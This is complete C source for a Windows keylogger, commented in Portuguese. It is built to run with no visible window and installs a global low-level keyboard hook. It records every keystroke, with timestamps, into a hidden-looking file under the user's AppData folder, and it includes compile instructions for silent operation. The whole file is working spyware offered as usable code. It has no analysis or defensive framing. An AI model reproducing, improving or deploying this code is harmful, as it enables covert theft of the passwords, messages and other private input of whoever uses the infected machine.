/*
 * keylogger_silencioso.c
 *
 * Roda sem janela visível (subsistema WINDOWS), modo hook direto.
 * Grava as teclas capturadas em "teclas.txt" a cada 2 segundos.
 *
 * Compilação MinGW/GCC (sem janela):
 *   gcc keylogger_silencioso.c -o keylogger.exe -luser32 -mwindows
 *
 * Compilação MSVC (sem janela):
 *   cl keylogger_silencioso.c /link user32.lib /SUBSYSTEM:WINDOWS
 *
 * O flag -mwindows (GCC) ou /SUBSYSTEM:WINDOWS (MSVC) faz o executável
 * usar o subsistema GUI do Windows, então nenhuma janela de cmd é aberta.
 * O ponto de entrada muda de main() para WinMain().
 *
 * Para encerrar: use o Gerenciador de Tarefas (keylogger.exe).
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

/* ── Configurações ─────────────────────────────────────────── */
#define ARQUIVO_SAIDA   "teclas.txt"
#define INTERVALO_MS    2000      /* flush a cada 2 segundos */
#define BUF_MAX         65536       /* tamanho do buffer interno */

/* ── Estado global ──────────────────────────────────────────── */
static HHOOK   g_hook   = NULL;
static HANDLE  g_mutex  = NULL;   /* protege g_buffer         */
static HANDLE  g_mutex_global = NULL; /* previne múltiplas instâncias */
static char    g_buffer[BUF_MAX]; /* acúmulo de teclas        */
static int     g_buf_len = 0;
static volatile int g_rodando = 1;

/* ── Utilitários ────────────────────────────────────────────── */

/* Retorna timestamp no formato "YYYY-MM-DD HH:MM:SS" */
static void timestamp(char *out, int sz)
{
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    strftime(out, sz, "%Y-%m-%d %H:%M:%S", tm_info);
}

/*
 * nome_tecla:
 *   Converte um Virtual Key code em string legível.
 *   Para letras/dígitos retorna o próprio caractere.
 *   Considera Shift para diferenciar maiúsculas/minúsculas e símbolos.
 */
static const char *nome_tecla(DWORD vk, DWORD scanCode, char *buf, int buf_sz)
{
    /* Shift pressionado agora? */
    int shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    int caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0; /* CapsLock ativo */

    /* Letras A-Z */
    if (vk >= 'A' && vk <= 'Z') {
        int maiuscula = shift ^ caps;
        buf[0] = maiuscula ? (char)vk : (char)(vk + 32);
        buf[1] = '\0';
        return buf;
    }

    /* Dígitos com shift (símbolos do teclado ABNT2) */
    if (!shift && vk >= '0' && vk <= '9') {
        buf[0] = (char)vk;
        buf[1] = '\0';
        return buf;
    }

    /* Teclas especiais mapeadas manualmente */
    switch (vk) {
        case VK_SPACE:   return " ";
        case VK_RETURN:  return "\n";
        case VK_TAB:     return "\t";
        case VK_BACK:    return "[BS]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:  return "[DEL]";
        case VK_LEFT:    return "[←]";
        case VK_RIGHT:   return "[→]";
        case VK_UP:      return "[↑]";
        case VK_DOWN:    return "[↓]";
        case VK_HOME:    return "[HOME]";
        case VK_END:     return "[END]";
        case VK_PRIOR:   return "[PGUP]";
        case VK_NEXT:    return "[PGDN]";
        case VK_INSERT:  return "[INSERT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_SHIFT:   /* ignorar teclas modificadoras sozinhas */
        case VK_CONTROL:
        case VK_MENU:
        case VK_LWIN:
        case VK_RWIN:
            return NULL;
        case VK_F1:  return "[F1]";
        case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";
        case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";
        case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";
        case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
    }

    /*
     * Para qualquer outra tecla, converte via ToUnicode para capturar
     * caracteres especiais do layout do teclado (ç, ~, ´, etc.)
     */
    BYTE keyState[256];
    GetKeyboardState(keyState);
    WCHAR unicode[4] = {0};
    int r = ToUnicode(vk, scanCode, keyState, unicode, 3, 0);
    if (r == 1) {
        /* Converte para UTF-8 */
        int n = WideCharToMultiByte(CP_UTF8, 0, unicode, 1, buf, buf_sz - 1, NULL, NULL);
        buf[n] = '\0';
        return buf;
    }

    snprintf(buf, buf_sz, "[VK:%02X]", (unsigned)vk);
    return buf;
}

/* Adiciona texto ao buffer protegido por mutex */
static void buffer_append(const char *texto)
{
    if (!texto || !*texto) return;
    WaitForSingleObject(g_mutex, INFINITE);
    int len = (int)strlen(texto);
    if (g_buf_len + len < BUF_MAX - 1) {
        memcpy(g_buffer + g_buf_len, texto, len);
        g_buf_len += len;
        g_buffer[g_buf_len] = '\0';
    }
    ReleaseMutex(g_mutex);
}

/* ── Callback do hook ───────────────────────────────────────── */
static LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
        char buf[16];
        const char *tecla = nome_tecla(info->vkCode, info->scanCode, buf, sizeof(buf));
        if (tecla)
            buffer_append(tecla);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

/* ── Thread de flush ────────────────────────────────────────── */
/*
 * Acorda a cada INTERVALO_MS milissegundos.
 * Se houver conteúdo no buffer, abre o arquivo em modo append,
 * escreve um cabeçalho com timestamp e o conteúdo acumulado,
 * depois esvazia o buffer.
 */
static DWORD WINAPI thread_flush(LPVOID param)
{
    (void)param;

    while (g_rodando) {
        Sleep(INTERVALO_MS);

        WaitForSingleObject(g_mutex, INFINITE);

        if (g_buf_len > 0) {
            char path[MAX_PATH + 20];
            const char *appdata = getenv("APPDATA");
            if (appdata) {
                strcpy(path, appdata);
                strcat(path, "\\MainFKB");
                CreateDirectory(path, NULL);
                strcat(path, "\\teclas.txt");
                FILE *f = fopen(path, "a");
                if (f) {
                    char ts[32];
                    timestamp(ts, sizeof(ts));
                    fprintf(f, "\n[%s]\n%s", ts, g_buffer);
                    fclose(f);
                }
            }
            g_buf_len = 0;
            g_buffer[0] = '\0';
        }

        ReleaseMutex(g_mutex);
    }

    return 0;
}

/* ── Ponto de entrada (subsistema WINDOWS) ──────────────────── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* Cria um mutex global nomeado para prevenir múltiplas instâncias */
    g_mutex_global = CreateMutex(NULL, TRUE, "Global\\KeyloggerFKB");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_mutex_global);
        return 0;
    }

    /* Mutex para proteger o buffer compartilhado */
    g_mutex = CreateMutex(NULL, FALSE, NULL);
    if (!g_mutex) {
        ReleaseMutex(g_mutex_global);
        CloseHandle(g_mutex_global);
        return 1;
    }

    /* Inicia thread de flush */
    HANDLE hThread = CreateThread(NULL, 0, thread_flush, NULL, 0, NULL);
    if (!hThread) {
        ReleaseMutex(g_mutex_global);
        CloseHandle(g_mutex_global);
        return 1;
    }

    /* Instala o hook de teclado global de baixo nível */
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (!g_hook) {
        g_rodando = 0;
        WaitForSingleObject(hThread, INFINITE);
        return 1;
    }

    /*
     * Message loop — obrigatório para WH_KEYBOARD_LL funcionar.
     * GetMessage bloqueia até chegar uma mensagem (eficiente, sem spin).
     */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    /* Limpeza */
    g_rodando = 0;
    UnhookWindowsHookEx(g_hook);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(g_mutex);
    ReleaseMutex(g_mutex_global);
    CloseHandle(g_mutex_global);

    return 0;
}